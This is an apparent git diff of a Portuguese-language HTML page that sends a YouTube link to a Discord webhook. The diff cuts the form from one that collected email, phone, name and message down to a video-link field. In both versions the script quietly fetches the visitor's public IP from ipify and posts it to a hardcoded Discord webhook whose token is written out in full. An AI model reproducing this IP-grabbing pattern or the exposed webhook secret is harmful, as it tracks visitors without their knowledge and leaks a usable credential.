@@ -2,152 +2,55 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>🚀 Divulgador de Vídeo no Discord - Seguro</title>
+  <title>🚀 Teste de Webhook</title>
   <style>
-    body {
-      background: linear-gradient(135deg, #23272a, #2c2f33);
-      color: #ffffff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 700px;
-      margin: 60px auto;
-      padding: 40px;
-      background-color: #2b2d31;
-      border-radius: 16px;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
-      text-align: center;
-      animation: fadeIn 1s ease-in;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 30px;
-      color: #f0f0f0;
-    }
-    input[type="text"], input[type="email"], input[type="tel"], textarea {
-      width: 95%;
-      padding: 14px;
-      margin: 12px 0;
-      border-radius: 10px;
-      border: none;
-      font-size: 16px;
-      background-color: #40444b;
-      color: #fff;
-      transition: transform 0.2s;
-    }
-    input:focus, textarea:focus {
-      outline: none;
-      transform: scale(1.02);
-    }
-    button {
-      padding: 18px 50px;
-      background-color: #5865f2;
-      border: none;
-      border-radius: 10px;
-      color: #fff;
-      font-size: 18px;
-      cursor: pointer;
-      margin-top: 20px;
-      transition: background-color 0.3s, transform 0.2s;
-    }
-    button:hover {
-      background-color: #4752c4;
-      transform: scale(1.05);
-    }
-    .status {
-      margin-top: 25px;
-      font-size: 1rem;
-    }
-    .success { color: #43b581; }
-    .error { color: #f04747; }
+    body { background: #2c2f33; color: #fff; font-family: sans-serif; text-align: center; }
+    .container { margin: 50px auto; width: 90%; max-width: 600px; }
+    input, button { margin: 10px; padding: 10px; width: 90%; }
+    .status { margin-top: 20px; }
   </style>
 </head>
 <body>
-  <div class="container" id="formContainer">
-    <h1>🚀 Divulgue Seu Vídeo no Discord - Seguro</h1>
-    <input type="email" id="userEmail" placeholder="Seu e-mail">
-    <input type="tel" id="userPhone" placeholder="Seu telefone">
+  <div class="container">
+    <h1>🚀 Teste de Envio para Discord</h1>
     <input type="text" id="videoUrl" placeholder="Link do vídeo do YouTube">
-    <input type="text" id="authorName" placeholder="Nome do autor (opcional)">
-    <textarea id="customMessage" rows="4" placeholder="Mensagem personalizada (opcional)"></textarea>
-    <button onclick="sendToWebhook()">Enviar para Discord</button>
+    <button onclick="sendToWebhook()">Enviar</button>
     <div class="status" id="status"></div>
   </div>
 
   <script>
-    function validateEmail(email) {
-      const re = /^[^@]+@[^@]+\.[^@]+$/;
-      return re.test(email);
-    }
-
-    function validatePhone(phone) {
-      const re = /^\+?\d{8,15}$/;
-      return re.test(phone.replace(/\D/g, ""));
-    }
-
     function sendToWebhook() {
-      const webhookUrl = "https://discord.com/api/webhooks/1390168959424135169/pHrZni7scp-0e3r28qJQrZkgJguHo7nErivAj23zb4hMrat27noGD1Dy6CwTZqLmbTtU";
-      const email = document.getElementById("userEmail").value.trim();
-      const phone = document.getElementById("userPhone").value.trim().replace(/\D/g, "");
+      const webhookUrl = "https://discord.com/api/webhooks/1390168959424135169/pHrZni7scp-0e3r28qJQrZkgJguHo7nErivAj23zb4hMrat27noGD1Dy6CwTZqLmbTtU"; // Troque pelo seu webhook!
       const videoUrl = document.getElementById("videoUrl").value.trim();
-      const author = document.getElementById("authorName").value.trim() || "Alguém misterioso";
-      const customMessage = document.getElementById("customMessage").value.trim();
       const status = document.getElementById("status");
 
-      if (!validateEmail(email)) {
-        status.innerHTML = "<p class='error'>📧 E-mail inválido! Nem tente se passar por alguém.</p>";
-        return;
-      }
-      if (!validatePhone(phone)) {
-        status.innerHTML = "<p class='error'>📱 Telefone inválido! Coloque um número real, bonitão.</p>";
-        return;
-      }
       if (!videoUrl) {
-        status.innerHTML = "<p class='error'>💥 Você esqueceu de colocar o link do vídeo, gênio!</p>";
+        status.innerHTML = "<p style='color:red;'>💥 Faltou o link do vídeo!</p>";
         return;
       }
 
       fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
-          const userIp = data.ip || "Desconhecido";
+          const ip = data.ip || "Desconhecido";
+          const msg = `🚨 Novo envio:\n🎥 Vídeo: ${videoUrl}\n🌐 IP: ${ip}`;
 
-          const message = [
-            "🚨 **Registro de Divulgação**",
-            `👤 **E-mail:** ${email}`,
-            `📱 **Telefone:** ${phone}`,
-            `📝 **Autor:** ${author}`,
-            `💬 **Mensagem:** ${customMessage || "Nenhuma"}`,
-            `📺 **Vídeo:** ${videoUrl}`,
-            `🌐 **IP:** ${userIp}`
-          ].join("\n");
-
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: message })
-          })
-          .then(response => {
-            if (response.ok) {
-              status.innerHTML = "<p class='success'>✅ Mensagem enviada com sucesso! Dados salvos para possíveis denúncias.</p>";
-            } else {
-              status.innerHTML = "<p class='error'>❌ Erro ao enviar mensagem. Verifique o webhook!</p>";
-            }
-          })
-          .catch(error => {
-            console.error(error);
-            status.innerHTML = "<p class='error'>❌ Não consegui nem conectar ao webhook. Chama o Wi-Fi!</p>";
+          return fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: msg })
           });
         })
+        .then(resp => {
+          if (resp.ok) {
+            status.innerHTML = "<p style='color:green;'>✅ Mensagem enviada com sucesso!</p>";
+          } else {
+            status.innerHTML = "<p style='color:red;'>❌ Erro ao enviar. Webhook inválido?</p>";
+          }
+        })
         .catch(err => {
-          console.error("Erro ao obter IP:", err);
-          status.innerHTML = "<p class='error'>❌ Erro ao obter seu IP. Tente novamente mais tarde.</p>";
+          console.error(err);
+          status.innerHTML = "<p style='color:red;'>❌ Erro na requisição!</p>";
         });
     }
   </script>
